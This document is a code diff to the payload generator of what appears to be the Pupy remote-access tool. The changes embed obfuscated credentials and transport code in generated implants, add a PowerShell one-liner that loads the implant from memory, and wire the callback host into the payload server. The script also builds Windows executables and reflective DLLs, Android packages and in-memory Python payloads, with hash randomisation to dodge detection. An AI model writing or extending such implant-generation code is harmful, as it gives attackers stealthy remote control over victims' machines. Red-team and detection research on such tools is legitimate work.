@@ -6,12 +6,15 @@
 import logging, argparse, sys, os.path, re, shlex, random, string, zipfile, tarfile, tempfile, shutil, subprocess, traceback, pkgutil
 from pupylib.utils.network import get_local_ip
 from pupylib.utils.term import colorize
+from pupylib.payloads.python_packer import gen_package_pickled_dic
 from pupylib.payloads.py_oneliner import serve_payload, pack_py_payload
 from pupylib.utils.obfuscate import compress_encode_obfs
 from network.conf import transports, launchers
-from network.base_launcher import LauncherError
+from network.lib.base_launcher import LauncherError
 from scriptlets.scriptlets import ScriptletArgumentError
 import scriptlets
+import cPickle
+
 
 def get_edit_pupyx86_dll(conf):
     return get_edit_binary(os.path.join("payload_templates","pupyx86.dll"), conf)
@@ -50,6 +53,14 @@ def get_edit_binary(path, conf):
     binary=binary[0:offsets[0]]+new_conf+binary[offsets[0]+len(new_conf):]
     return binary
 
+def get_credential(name):
+    creds_src=open("crypto/credentials.py","r").read()
+    creds={}
+    exec creds_src in {}, creds
+    if name in creds:
+        return creds[name]
+    return None
+
 def get_raw_conf(conf, obfuscate=False):
     if not "offline_script" in conf:
         offline_script=""
@@ -59,6 +70,37 @@ def get_raw_conf(conf, obfuscate=False):
     obf_func=lambda x:x
     if obfuscate:
         obf_func=compress_encode_obfs
+
+
+    l=launchers[conf['launcher']]()
+    l.parse_args(conf['launcher_args'])
+    t=transports[l.get_transport()]
+
+    #pack credentials
+    creds_src=open("crypto/credentials.py","r").read()
+    creds={}
+    exec creds_src in {}, creds
+    cred_src=b""
+    creds_list=t.credentials
+    if conf['launcher']=="bind":
+        creds_list.append("BIND_PAYLOADS_PASSWORD")
+    for c in creds_list:
+        if c in creds:
+            print colorize("[+] ", "green")+"Embedding credentials %s"%c
+            cred_src+=obf_func("%s=%s"%(c, repr(creds[c])))+"\n"
+        else:
+            print colorize("[!] ", "yellow")+"[-] Credential %s have not been found for transport %s. Fall-back to default credentials. You should edit your crypto/credentials.py file"%(c, l.get_transport())
+    pupy_credentials_mod={"pupy_credentials.py" : cred_src}
+
+    new_conf+=compress_encode_obfs("pupyimporter.pupy_add_package(%s)"%repr(cPickle.dumps(pupy_credentials_mod)))+"\n"
+
+    #pack custom transport conf:
+    l.get_transport()
+    ROOT=os.path.abspath(os.path.join(os.path.dirname(__file__)))
+    transport_conf_dic=gen_package_pickled_dic(ROOT+os.sep, "network.transports.%s"%l.get_transport())
+    #add custom transport and reload network conf
+    new_conf+=compress_encode_obfs("pupyimporter.pupy_add_package(%s)"%repr(cPickle.dumps(transport_conf_dic)))+"\nimport sys\nsys.modules.pop('network.conf')\nimport network.conf\n"
+    
 
     new_conf+=obf_func("LAUNCHER=%s"%(repr(conf['launcher'])))+"\n"
     new_conf+=obf_func("LAUNCHER_ARGS=%s"%(repr(conf['launcher_args'])))+"\n"
@@ -190,32 +232,39 @@ def parse_scriptlets(args_scriptlet, debug=False):
 
 class ListOptions(argparse.Action):
     def __call__(self, parser, namespace, values, option_string=None):
-        print colorize("## available formats :", "green")
+        print colorize("## available formats :", "green")+" usage: -f <format>"
         print "\t- exe_86, exe_x64 : generate PE exe for windows"
         print "\t- dll_86, dll_x64 : generate reflective dll for windows"
         print "\t- py              : generate a fully packaged python file (with all the dependencies packaged and executed from memory), all os (need the python interpreter installed)"
-        print "\t- py_oneliner     : same as \"py\" format but served over http to load it from a single command line"
+        print "\t- py_oneliner     : same as \"py\" format but served over http to load it from memory with a single command line."
+        print "\t- ps1_oneliner    : load pupy remotely from memory with a single command line using powershell."
 
         print ""
-        print colorize("## available transports :","green")
-        for name, dic in transports.iteritems():
-            print "\t- {:<20} : {}".format(name, dic["info"])
-        print ""
-        print colorize("## available scriptlets :", "green")
+        print colorize("## available transports :","green")+" usage: -t <transport>"
+        for name, tc in transports.iteritems():
+            try:
+                print "\t- {:<14} : {}".format(name, tc.info)
+            except Exception as e:
+                logging.error(e)
+
+        print colorize("## available scriptlets :", "green")+" usage: -s <scriptlet>,<arg1>=<value>,<args2=value>..."
         scriptlets_dic=load_scriptlets()
         for name, sc in scriptlets_dic.iteritems():
             print "\t- {:<15} : ".format(name)
             print '\n'.join(["\t"+x for x in sc.get_help().split("\n")])
         exit()
 
-PAYLOAD_FORMATS=['apk', 'exe_x86', 'exe_x64', 'dll_x86', 'dll_x64', 'py', 'py_oneliner']
+PAYLOAD_FORMATS=['apk', 'exe_x86', 'exe_x64', 'dll_x86', 'dll_x64', 'py', 'py_oneliner', 'ps1_oneliner']
 if __name__=="__main__":
+    if os.path.dirname(__file__):
+        os.chdir(os.path.dirname(__file__))
+
     parser = argparse.ArgumentParser(description='Generate payloads for windows, linux, osx and android.')
     parser.add_argument('-f', '--format', default='exe_x86', choices=PAYLOAD_FORMATS, help="(default: exe_x86)")
     parser.add_argument('-o', '--output', help="output path")
     parser.add_argument('-s', '--scriptlet', default=[], action='append', help="offline python scriptlets to execute before starting the connection. Multiple scriptlets can be privided.")
     parser.add_argument('-l', '--list', action=ListOptions, nargs=0, help="list available formats, transports, scriptlets and options")
-    parser.add_argument('-i', '--interface', default="eth0", help="The default interface to listen on")
+    parser.add_argument('-i', '--interface', default=None, help="The default interface to listen on")
     parser.add_argument('--randomize-hash', action='store_true', help="add a random string in the exe to make it's hash unknown")
     parser.add_argument('--debug-scriptlets', action='store_true', help="don't catch scriptlets exceptions on the client for debug purposes")
     parser.add_argument('launcher', choices=[x for x in launchers.iterkeys()], default='auto_proxy', help="Choose a launcher. Launchers make payloads behave differently at startup.")
@@ -253,7 +302,6 @@ if __name__=="__main__":
     conf['launcher']=args.launcher
     conf['launcher_args']=args.launcher_args
     conf['offline_script']=script_code
-
     outpath=args.output
     if args.format=="exe_x86":
         binary=get_edit_pupyx86_exe(conf)
@@ -291,7 +339,14 @@ if __name__=="__main__":
             w.write("#!/usr/bin/env python\n# -*- coding: UTF8 -*-\n"+packed_payload)
     elif args.format=="py_oneliner":
         packed_payload=pack_py_payload(get_raw_conf(conf))
-        serve_payload(packed_payload)
+        i=conf["launcher_args"].index("--host")+1
+        link_ip=conf["launcher_args"][i].split(":",1)[0]
+        serve_payload(packed_payload, link_ip=link_ip)
+    elif args.format=="ps1_oneliner":
+        from pupylib.payloads.ps1_oneliner import serve_ps1_payload
+        i=conf["launcher_args"].index("--host")+1
+        link_ip=conf["launcher_args"][i].split(":",1)[0]
+        serve_ps1_payload(conf, link_ip=link_ip)
     else:
         exit("Type %s is invalid."%(args.format))
     print(colorize("[+] ","green")+"payload successfully generated with config :")
